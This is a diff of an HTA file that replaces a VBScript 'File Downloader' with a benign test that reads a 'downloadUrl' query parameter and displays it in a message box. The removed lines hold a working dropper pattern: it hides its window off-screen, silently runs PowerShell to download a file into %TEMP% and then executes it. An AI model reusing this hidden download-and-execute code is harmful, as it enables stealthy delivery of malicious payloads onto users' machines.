@@ -1,32 +1,41 @@
 <html>
   <head>
-    <title>File Downloader</title>
+    <title>Parameter Test</title>
   </head>
   <body>
-    <h2>File Downloader</h2>
-    <p>This HTA downloads and executes a file a.</p>
+    <h2>HTA Parameter Test</h2>
+    <p>Checking provided URL...</p>
   </body>
 
   <script language="VBScript">
-    Sub DownloadAndExecute()
-      Window.ResizeTo 1, 1
-      Window.MoveTo -32000, -32000
-      Set objShell = CreateObject("WScript.Shell")
-      tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
-      downloadUrl = "https://shared.steamstatic.com/store_item_assets/steam/apps/1721470/header.jpg" ' Replace with your download URL
-      downloadedFile = tempFolder & "\header.jpg"
-      cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
-      objShell.Run "cmd.exe /c " & cmdCommand, 0, True
-      If FileExists(downloadedFile) Then
-        objShell.Run Chr(34) & downloadedFile & Chr(34), 1, False
+    Function GetQueryParameter(paramName)
+      Dim query, params, i, param, nameValue
+      query = Window.Location.search
+      params = Split(Mid(query, 2), "&") ' Remove the "?" and split by "&"
+
+      For i = 0 To UBound(params)
+        param = params(i)
+        nameValue = Split(param, "=")
+        If LCase(nameValue(0)) = LCase(paramName) Then
+          GetQueryParameter = nameValue(1)
+          Exit Function
+        End If
+      Next
+      GetQueryParameter = ""
+    End Function
+
+    Sub DisplayURL()
+      Dim downloadUrl
+      downloadUrl = GetQueryParameter("downloadUrl")
+
+      If downloadUrl = "" Then
+        MsgBox "No download URL provided!", vbCritical
+      Else
+        MsgBox "The provided URL is: " & downloadUrl, vbInformation
       End If
     End Sub
 
-    Function FileExists(filePath)
-      Set fso = CreateObject("Scripting.FileSystemObject")
-      FileExists = fso.FileExists(filePath)
-    End Function
-
-    DownloadAndExecute
+    ' Call the function to display the URL
+    DisplayURL
   </script>
 </html>
